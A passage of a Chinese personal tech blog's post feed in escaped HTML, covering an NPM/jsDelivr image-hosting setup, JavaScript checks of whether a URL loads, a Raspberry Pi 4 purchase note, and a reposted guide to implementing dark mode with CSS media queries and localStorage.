 <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> 